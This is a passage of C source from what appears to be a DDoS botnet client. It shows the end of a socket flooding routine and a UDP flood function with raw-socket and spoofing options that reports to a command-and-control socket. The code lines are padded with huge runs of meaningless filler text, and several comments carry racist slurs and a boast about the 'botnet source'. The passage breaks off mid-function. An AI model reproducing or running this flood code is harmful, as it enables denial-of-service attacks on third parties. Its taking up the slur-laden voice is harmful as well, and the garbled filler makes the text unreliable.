SHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                socket = socket_connect(host, port);//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                if (socket != 0) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    write(socket, request, strlen(request));//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    read(socket, buffer, 1);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    close(socket);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                }
            }
           exit(0);
       }
    }
}
// Attacks Ends HERE

void sendUDP(unsigned char * target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  register unsigned int pollRegister;
  pollRegister = pollinterval;

  if (spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (!sockfd) {
      sockprintf(mainCommSock, "Failed opening raw socket.");
      return;
    }

    unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
    if (buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    RandString(buf, packetsize);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, buf, packetsize, 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      if (i == pollRegister) {
        if (port == 0) dest_addr.sin_port = rand_cmwc();
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;
      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (!sockfd) {
      sockprintf(mainCommSock, "Failed opening raw socket.");
      return;
    }

    int tmp = 1;
